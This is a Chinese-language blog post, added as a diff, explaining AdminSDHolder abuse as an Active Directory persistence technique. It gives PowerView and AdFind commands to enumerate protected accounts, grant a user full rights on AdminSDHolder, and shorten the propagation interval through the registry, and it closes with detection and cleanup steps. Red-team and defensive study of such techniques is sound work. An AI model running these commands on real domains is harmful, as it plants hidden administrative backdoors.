@@ -1,0 +1,302 @@
+<article class="post">
+  <h1>域渗透——AdminSDHolder</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>AdminSDHolder是一个特殊的AD容器，具有一些默认安全权限，用作受保护的AD账户和组的模板</p>
+
+<p>Active Directory将采用AdminSDHolder对象的ACL并定期将其应用于所有受保护的AD账户和组，以防止意外和无意的修改并确保对这些对象的访问是安全的</p>
+
+<p>如果能够修改AdminSDHolder对象的ACL，那么修改的权限将自动应用于所有受保护的AD账户和组，这可以作为一个域环境权限维持的方法</p>
+
+<p>本将要参考公开资料，结合自己的理解，介绍利用方法，补全清除ACL的方法，分析检测方法</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>利用思路</li>
+  <li>如何枚举受保护的AD账户和组中的信息</li>
+  <li>如何查询AdminSDHolder对象的ACL</li>
+  <li>如何向AdminSDHolder对象添加ACL</li>
+  <li>删除AdminSDHolder中指定用户的ACL</li>
+  <li>完整利用方法</li>
+  <li>检测建议</li>
+</ul>
+
+<h2 id="0x02-利用思路">0x02 利用思路</h2>
+<hr>
+
+<h3 id="1枚举受保护的ad账户和组中的信息">1.枚举受保护的AD账户和组中的信息</h3>
+
+<p>通常为域内高权限用户，在我的Server2008R2下包含以下组：</p>
+
+<ul>
+  <li>Administrators</li>
+  <li>Print Operators</li>
+  <li>Backup Operators</li>
+  <li>Replicator</li>
+  <li>Domain Controllers</li>
+  <li>Schema Admins</li>
+  <li>Enterprise Admins</li>
+  <li>Domain Admins</li>
+  <li>Server Operators</li>
+  <li>Account Operators</li>
+  <li>Read-only Domain Controllers</li>
+  <li>Organization Management</li>
+  <li>Exchange Trusted Subsystem</li>
+</ul>
+
+<h3 id="2向adminsdholder对象添加acl">2.向AdminSDHolder对象添加ACL</h3>
+
+<p>例如，添加用户testa对AdminSDHolder的完全管理权限，默认60分钟以后会自动推送权限配置信息，testa随即获得对所有受保护帐户和组的完全管理权限</p>
+
+<h3 id="3获得对整个域的控制权限">3.获得对整个域的控制权限</h3>
+
+<p>此时用户testa能够向域管理员组添加帐户，也能够直接访问域控制器上的文件</p>
+
+<h2 id="0x03-枚举受保护的ad账户和组中的信息">0x03 枚举受保护的AD账户和组中的信息</h2>
+<hr>
+
+<p>关于AdminSDHolder，可以参考的资料：</p>
+
+<p>https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)#id0250006</p>
+
+<p>受保护的AD账户和组的特征如下：</p>
+
+<p><strong>AdminCount属性为1</strong></p>
+
+<p>但是，如果对象已移出受保护组，其AdminCount属性仍为1，也就是说，有可能获得曾经是受保护组的帐户和组</p>
+
+<h3 id="1枚举受保护ad账户的方法">1.枚举受保护AD账户的方法</h3>
+
+<h4 id="1powerview">(1)PowerView</h4>
+
+<p>下载地址：</p>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetUser -AdminCount
+</code></pre></div></div>
+
+<p>只筛选出用户名的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetUser -AdminCount |select samaccountname
+</code></pre></div></div>
+
+<h4 id="2adfind">(2)Adfind</h4>
+
+<p>下载地址：</p>
+
+<p>http://www.joeware.net/freetools/tools/adfind/index.htm</p>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Adfind.exe -f "&amp;(objectcategory=person)(samaccountname=*)(admincount=1)" -dn
+</code></pre></div></div>
+
+<h4 id="3activedirectory模块">(3)ActiveDirectory模块</h4>
+
+<p>Powershell模块，需要安装，域控制器一般会安装</p>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module ActiveDirectory
+Get-ADObject -LDAPFilter “(&amp;(admincount=1)(|(objectcategory=person)(objectcategory=group)))” |select name
+</code></pre></div></div>
+
+<p>对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\Microsoft.ActiveDirectory.Management.dll
+</code></pre></div></div>
+
+<p>Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：</p>
+
+<p>https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</p>
+
+<p><strong>注：</strong></p>
+
+<p>该命令会列出受保护的AD账户和组</p>
+
+<h3 id="2枚举受保护ad组的方法">2.枚举受保护AD组的方法</h3>
+
+<h4 id="1powerview-1">(1)PowerView</h4>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetGroup -AdminCount
+</code></pre></div></div>
+
+<h4 id="2adfind-1">(2)Adfind</h4>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Adfind.exe -f "&amp;(objectcategory=group)(admincount=1)" -dn
+</code></pre></div></div>
+
+<h4 id="3activedirectory模块-1">(3)ActiveDirectory模块</h4>
+
+<p>Powershell模块，需要安装，域控制器一般会安装</p>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module ActiveDirectory
+Get-ADObject -LDAPFilter “(&amp;(admincount=1)(|(objectcategory=person)(objectcategory=group)))” |select name
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>该命令会列出受保护的AD账户和组</p>
+
+<h2 id="0x04-操作adminsdholder对象的acl">0x04 操作AdminSDHolder对象的ACL</h2>
+<hr>
+
+<h3 id="1查询adminsdholder对象的acl">1.查询AdminSDHolder对象的ACL</h3>
+
+<p>使用PowerView，地址如下：</p>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>
+
+<p><strong>注：</strong></p>
+
+<p>该版本不支持<code class="language-plaintext highlighter-rouge">Remove-DomainObjectAcl</code>命令</p>
+
+<p>查询AdminSDHolder对象的ACL等价于查询”CN=AdminSDHolder,CN=System,DC=test,DC=com”的ACL</p>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
+Get-ObjectAcl -ADSprefix "CN=AdminSDHolder,CN=System" |select IdentityReference
+</code></pre></div></div>
+
+<h3 id="2向adminsdholder对象添加acl-1">2.向AdminSDHolder对象添加ACL</h3>
+
+<p>使用PowerView，地址如下：</p>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>
+
+<p>添加用户testa的完全访问权限，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName testa -Verbose -Rights All
+</code></pre></div></div>
+
+<p>默认等待60分钟以后，testa获得对所有受保护的AD账户和组的完全访问权限</p>
+
+<h3 id="3删除adminsdholder中指定用户的acl">3.删除AdminSDHolder中指定用户的ACL</h3>
+
+<p>使用PowerView，地址如下：</p>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>
+
+<p><strong>注：</strong></p>
+
+<p>该版本支持<code class="language-plaintext highlighter-rouge">Remove-DomainObjectAcl</code>命令，但不支持参数TargetADSprefix，所以这里使用TargetSearchBase参数代替</p>
+
+<p>搜索条件为<code class="language-plaintext highlighter-rouge">"LDAP://CN=AdminSDHolder,CN=System,DC=test,DC=com"</code></p>
+
+<p>删除用户testa的完全访问权限，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-DomainObjectAcl -TargetSearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=test,DC=com" -PrincipalIdentity testa -Rights All -Verbose
+</code></pre></div></div>
+
+<h2 id="0x05-完整利用思路">0x05 完整利用思路</h2>
+<hr>
+
+<h3 id="1枚举受保护的ad账户和组中的信息-1">1.枚举受保护的AD账户和组中的信息</h3>
+
+<p>查找有价值的用户，需要确认该用户是否属于受保护的AD账户和组，排除曾经属于受保护的AD账户和组</p>
+
+<h3 id="2向adminsdholder对象添加acl-2">2.向AdminSDHolder对象添加ACL</h3>
+
+<p>例如添加用户testa对AdminSDHolder的完全访问权限</p>
+
+<p>默认等待60分钟以后，testa获得对所有受保护的AD账户和组的完全访问权限</p>
+
+<p>可以通过修改注册表的方式设置权限推送的间隔时间，注册表位置如下：</p>
+
+<ul>
+  <li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters,AdminSDProtectFrequency,REG_DWORD</li>
+</ul>
+
+<p>例如修改成等待600秒的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v AdminSDProtectFrequency /t REG_DWORD /d 600
+</code></pre></div></div>
+
+<p>参考资料：</p>
+
+<p>https://blogs.technet.microsoft.com/askds/2009/05/07/five-common-questions-about-adminsdholder-and-sdprop/</p>
+
+<p><strong>注：</strong></p>
+
+<p>不建议降低默认间隔时间，因为在大型环境中可能会导致LSASS性能下降</p>
+
+<h3 id="3获得对整个域的控制权限-1">3.获得对整个域的控制权限</h3>
+
+<h4 id="1用户testa能够向域管理员组添加帐户">(1)用户testa能够向域管理员组添加帐户</h4>
+
+<p>验证权限的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
+Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'testa'}
+</code></pre></div></div>
+
+<h4 id="2用户testa能够直接访问域控制器上的文件">(2)用户testa能够直接访问域控制器上的文件</h4>
+
+<h2 id="0x06-检测和清除">0x06 检测和清除</h2>
+<hr>
+
+<h3 id="1检测adminsdholder的acl">1.检测AdminSDHolder的ACL</h3>
+
+<p>查看<code class="language-plaintext highlighter-rouge">"CN=AdminSDHolder,CN=System,DC=test,DC=com"</code>的ACL，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
+Get-ObjectAcl -ADSprefix "CN=AdminSDHolder,CN=System" |select IdentityReference
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>这里使用的PowerView版本：</p>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>
+
+<p>查看是否有可疑用户</p>
+
+<h3 id="2清除adminsdholder中可疑用户的acl">2.清除AdminSDHolder中可疑用户的ACL</h3>
+
+<p>删除AdminSDHolder中可疑用户testa的ACL</p>
+
+<p>使用PowerView，地址如下：</p>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>
+
+<p>删除用户testa的完全访问权限，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-DomainObjectAcl -TargetSearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=test,DC=com" -PrincipalIdentity testa -Rights All -Verbose
+</code></pre></div></div>
+
+<h2 id="0x07-小结">0x07 小结</h2>
+<hr>
+
+<p>本文介绍了AdminSDHolder作为权限维持的利用方法，补充了检测和清除AdminSDHolder中可疑用户ACL的方法</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on July 24, 2019
+  </div>
+
+  
+</article>
